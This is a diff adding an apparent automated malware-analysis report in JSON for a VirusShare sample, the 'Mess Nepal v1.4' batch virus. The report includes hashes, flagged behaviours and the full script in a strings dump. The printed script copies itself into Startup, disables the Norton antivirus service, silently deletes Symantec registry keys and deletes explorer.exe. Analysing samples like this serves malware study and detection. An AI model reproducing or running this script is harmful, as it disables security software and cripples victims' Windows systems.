@@ -1,0 +1,68 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "SYSTEM": "May run an executable file or a system command on a Mac",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "windows": "May enumerate application windows"
+        },
+        "macro": "@echo off\n\n\nIf Not Exist \"C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\nav32.bat\" Copy %0 \"C:\\DocumentC:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\nav32.bat\"\nIf Not Exist \"C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\sysconfig.bat\" Copy %0 \"C:\\DocumentC:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\sysconfig.bat\"\ngoto a\n\n:a\necho WSHShell = WScript.CreateObject(\"WScript.Shell\") >> c:\\messnepal.vbs\necho WSHShell.RegWrite(HKLM\\SYSTEM\\CurrentControlSet\\Services\\navapsvc\\start\", \"4\", \"REG_DWORD\") >> c:\\messnepal.vbs\nstart c:\\messnepal.vbs\ngoto b\n\n\n:b\necho [*-HKEY_LOCAL_MACHINE\\SOFTWARE\\Symantec] >> c:\\symantec1.REG\nregedit.exe /s symantec1.reg\ngoto c\n\n\n:c\necho [*-HKEY_CURRENT_USER\\Software\\Symantec] >> c:\\symantec2.REG\nregedit.exe /s symantec2.reg\ngoto d\n\n\n:d\necho [*-HKEY_CLASSES_ROOT\\symantec*.*] >> c:\\symantec3.REG\nregedit.exe /s symantec3.reg\ngoto e\n\n\n:e\nATTRIB C:\\windows\\EXPLORER.EXE -H -A -R\nDEL C:\\windows\\EXPLORER.EXE\ngoto f\n\n:f\n\necho *****************Mess Nepal v1.4********************* >> c:\\virusinfo.txt\nEXIT"
+    },
+    "filename": "VirusShare_35bbc8f1364231801edfc26d4df06bae",
+    "filesize": 1141,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "35bbc8f1364231801edfc26d4df06bae",
+        "sha1": "5652f9766f2ac2f96bfa1c5639524cae872379ab",
+        "sha256": "781f4b8bbb969b031a9ecc781d1f7d1b4162823eabe477c553d5f39b8011b97b"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "If Not Exist \"C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\nav32.bat\" Copy %0 \"C:\\DocumentC:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\nav32.bat\"",
+            "If Not Exist \"C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\sysconfig.bat\" Copy %0 \"C:\\DocumentC:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\sysconfig.bat\"",
+            "goto a",
+            "echo WSHShell = WScript.CreateObject(\"WScript.Shell\") >> c:\\messnepal.vbs",
+            "echo WSHShell.RegWrite(HKLM\\SYSTEM\\CurrentControlSet\\Services\\navapsvc\\start\", \"4\", \"REG_DWORD\") >> c:\\messnepal.vbs",
+            "start c:\\messnepal.vbs",
+            "goto b",
+            "echo [*-HKEY_LOCAL_MACHINE\\SOFTWARE\\Symantec] >> c:\\symantec1.REG",
+            "regedit.exe /s symantec1.reg",
+            "goto c",
+            "echo [*-HKEY_CURRENT_USER\\Software\\Symantec] >> c:\\symantec2.REG",
+            "regedit.exe /s symantec2.reg",
+            "goto d",
+            "echo [*-HKEY_CLASSES_ROOT\\symantec*.*] >> c:\\symantec3.REG",
+            "regedit.exe /s symantec3.reg",
+            "goto e",
+            "ATTRIB C:\\windows\\EXPLORER.EXE -H -A -R",
+            "DEL C:\\windows\\EXPLORER.EXE",
+            "goto f",
+            "echo *****************Mess Nepal v1.4********************* >> c:\\virusinfo.txt",
+            "EXIT"
+        ],
+        "file": {
+            "DEL C:\\windows\\EXPLORER.EXE": "Executable",
+            "echo *****************Mess Nepal v1.4********************* >> c:\\virusinfo.txt": "Text",
+            "echo [*-HKEY_CLASSES_ROOT\\symantec*.*] >> c:\\symantec3.REG": "Registry",
+            "echo [*-HKEY_CURRENT_USER\\Software\\Symantec] >> c:\\symantec2.REG": "Registry",
+            "echo [*-HKEY_LOCAL_MACHINE\\SOFTWARE\\Symantec] >> c:\\symantec1.REG": "Registry",
+            "regedit.exe /s symantec1.reg": "Registry",
+            "regedit.exe /s symantec2.reg": "Registry",
+            "regedit.exe /s symantec3.reg": "Registry"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.271251",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
